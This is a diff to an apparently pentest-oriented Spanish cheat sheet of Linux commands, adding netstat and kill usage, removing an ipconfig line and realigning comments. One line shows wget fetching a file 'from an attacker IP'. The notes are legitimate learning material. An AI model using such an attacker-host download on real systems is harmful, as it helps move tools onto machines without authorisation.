@@ -130,6 +130,13 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 
 ```bash
 ❯ netstat -nat                               # Para mirar la tabla de ruteo y algunos puertos abiertos
+
+❯ netstat -tupln                             # Miras las IPs, los puertos, sus estados de proceso y su PID
+	❯ kill -15 PID <number>                 # Matamos un proceso especifico colocando su PID
+	❯ kill -9 PID <number>                  # Otra manera de hacerlo 
+
+❯ netstat -antu                              # Miramos los estados de los puertos
+	❯ kill -9 $(lsof -i:80 -t)              # Matamos un proceso especifico colocando el puerto 
 ```
 
 ```bash
@@ -146,7 +153,6 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 ```bash 
 ❯ ip a                                       # Miras la IP que tienes asignada 
 ❯ ifconfig                                   # Miras la IP asignada en Linux
-❯ ipconfig                                   # Miras la IP asignada en Windows
 ```
 
 ```bash 
@@ -199,15 +205,15 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 ```
 
 ```bash 
-❯ md5sum file                              # Obtener el hash del archivo 
+❯ md5sum file                             # Obtener el hash del archivo 
 ```
 
 ```bash
-❯ wget http://❮IP❯/❮File❯                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
+❯ wget http://❮IP❯/❮File❯                 # Para poder cargar o descargar un archivo especifico desde una IP de atacante
 ```
 
 ```bash
-❯ curl http://❮IP❯:PORT                     # Para ver si hay contenido 
+❯ curl http://❮IP❯:PORT                   # Para ver si hay contenido 
 	# v = Verbosity
 ```
 
